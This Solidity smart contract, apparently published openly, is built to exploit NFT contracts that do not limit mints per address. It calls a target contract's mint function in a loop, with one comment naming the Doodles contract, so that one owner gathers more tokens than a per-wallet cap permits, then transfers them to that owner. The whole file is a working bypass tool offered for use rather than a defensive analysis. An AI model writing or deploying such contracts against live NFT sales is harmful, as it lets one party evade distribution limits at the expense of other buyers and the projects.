// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/access/Ownable.sol";
import "openzeppelin-contracts/contracts/token/ERC721/utils/ERC721Holder.sol";


/// @title NFT mass minter 
/// @author 0xMouseLess
/// @notice Exploiting NFTs that don't check number of mints per address
contract SimpleMinter is Ownable, ERC721Holder {
    /// @notice 
    TargetNFT targetNFT;

    /// @dev Price of a single
    uint256 immutable PRICE_PER_NFT = 0.05 ether;

    /// @dev Number of max mints allocated per call to mint function
    uint256 immutable MAX_MINT_PER_ADDRESS = 5;

    /// @notice Setting up contract
    /// @param _targetAddress Address of the NFT we want to mint
    constructor(address _targetAddress) Ownable() {
        targetNFT = TargetNFT(_targetAddress);
    }

    // @notice Repeatedly calls the mint function from the Doodles contract
    // @param numMints The number of times we want to call the mint function  
    function mint(uint numMints) external payable onlyOwner {
        for (uint i = 0; i < numMints; i++) {
            targetNFT.mint{value: PRICE_PER_NFT}(MAX_MINT_PER_ADDRESS);
        }
    }

    // @notice Method to transfer minted NFTs to contract owner
    // @param _tokenIds The IDs of the tokens we want to withdraw 
    function transferOut(uint[] calldata _tokenIds) external onlyOwner {
        for(uint i=0; i<_tokenIds.length; i++) {
            targetNFT.transferFrom(address(this), owner(), _tokenIds[i]);
        }
    }
}

// @title Interface based on our target contract 
interface TargetNFT {
    function mint(uint numberOfTokens) external payable;
    function transferFrom(address from, address to, uint256 tokenId) external;
}
